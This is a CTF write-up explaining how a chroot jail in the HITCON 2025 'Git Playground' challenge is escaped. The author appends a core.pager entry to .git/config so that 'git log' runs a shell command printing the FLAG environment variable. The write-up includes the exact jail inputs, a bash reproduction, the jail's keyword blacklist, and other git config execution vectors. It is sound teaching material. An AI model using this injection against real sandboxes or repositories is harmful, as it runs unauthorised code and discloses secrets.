---
title: "HITCON CTF 2025 — Writeup"
description: "HITCON CTF 2025 misc writeup for Git Playground: a chroot jail that hands you a real git repo plus arbitrary file writes, so overwriting core.pager in .git/config turns git log into flag disclosure through the shell."
date: 2026-08-06T02:08:07+0800
lastmod: 2026-08-06T02:08:07+0800
tag: "CTF, HITCON CTF, Misc, WriteUp"
lang: en-US
---

My HITCON CTF 2025 writeup. One misc challenge so far, `Git Playground`, where the
sandbox is careful about paths and command whitelists but forgets that a git repo's
own config is a code-execution surface.

## Contents

| Category | Challenge | Class of bug |
|---|---|---|
| Misc | Git Playground | core.pager injection via .git/config |

---

## Misc

### Git Playground

| | |
|---|---|
| **Flag** | `hitcon{Bu5yb0X_34511y_cR4sH_Wh3N_bu117_w17h_C14Ng?}` |

#### Overview

`run.sh` builds a minimal chroot with only `/bin`, `/root`, `/work`, and
`/dev/null`, notably no `/proc`, then drops you into `/bin/jail`. The flag lives in
an environment variable.

`jail.cpp` is a command loop that whitelists a handful of commands:

- `blacklist()` rejects any input line containing `sh`, `env`, or `hook`.
- `check()` allows `git {add,commit,status,log,diff,show}` plus
  `touch/cat/rm/mkdir/ls/rmdir/cp/mv`, each with strict path and charset rules that
  keep everything under `/work`.
- A special `echo` handler supports `echo <data> > path` and `echo <data> >> path`.

The obvious restrictions all hold: paths must resolve under `/work`, commit messages
are limited to `[A-Za-z0-9 ,.]`, and commit ids must be hex. The hole is somewhere
else.

#### Insight

The `echo` writer only enforces two things: the data has to pass
`check_printable_charset` (any `isprint` byte), and the path has to pass
`check_path_under_work` (alphanumerics plus `. / _ -`, resolving under `/work`).

`.git/config` satisfies the path check. The dot, slash, and letters are all allowed,
and `/work/.git/config` starts with `/work`. Since git initialized the repo in
`/work`, you can append to the repo's own config.

That matters because git's `core.pager` value runs through the shell and inherits the
current environment. A pager of `echo "$FLAG"` becomes `sh -c 'echo "$FLAG"'` with
`FLAG` still set, so there is no need for `/proc/self/environ`, which is good because
the chroot has no `/proc`. None of the payload lines contain `sh`, `env`, or `hook`,
so the blacklist never fires. The `.git/hooks` route would have been blocked, since
`hook` is on the list, which leaves `core.pager` as the clean path.

#### Exploitation

One command per line:

```text
touch /work/a                        # a file to commit
git add /work/a
git commit -m x                      # git log needs a commit to page
echo [core] >> .git/config
echo pager = echo "$FLAG" >> .git/config
git log                              # runs core.pager -> prints the flag
```

How the jail parses the two injecting lines:

- `echo [core] >> .git/config` gives data `[core]`, appended to the config.
- `echo pager = echo "$FLAG" >> .git/config` gives whitespace-joined data
  `pager = echo "$FLAG"`, appended under the `[core]` section.

The resulting config tail:

```ini
[core]
pager = echo "$FLAG"
```

`git log` is in git's page-by-default set, so on the jail's TTY it launches the
pager, which prints the flag instead of paging the log. A few things to keep in mind:

- git only invokes the pager when stdout is a terminal. The jail runs interactively
  on a TTY, so it fires. To reproduce locally, fake a TTY with
  `script -qec '...' /dev/null`.
- with zero commits `git log` errors out before paging, so make one commit first.
- quotes are optional but safer: `echo $FLAG` works when the flag has no
  shell-special characters, and `"$FLAG"` avoids surprises.

Local reproduction:

```bash
cd /tmp && rm -rf gp && mkdir gp && cd gp
git init -q -b main && git config user.email a@a && git config user.name a
printf '%s\n' '[core]' >> .git/config
printf '%s\n' 'pager = echo "$FLAG"' >> .git/config
touch a && git add a && git commit -qm x
FLAG="hitcon{demo}" script -qec 'git log' /dev/null   # -> hitcon{demo}
```

The `hitcon{demo}` value is just a placeholder for the local run. On the remote jail
the same steps print the real flag from its `FLAG` variable.

Flag: `hitcon{Bu5yb0X_34511y_cR4sH_Wh3N_bu117_w17h_C14Ng?}`

#### Root cause

The jail treats a git repo's own metadata as ordinary user data. Any sandbox that
hands a user a real git repo plus arbitrary writes inside it inherits git's full
config-driven code-execution surface: `core.pager`, `core.fsmonitor`,
`core.sshCommand`, aliases, hooks, and more. Blacklisting the word `hook` closes one
door and leaves the rest open.
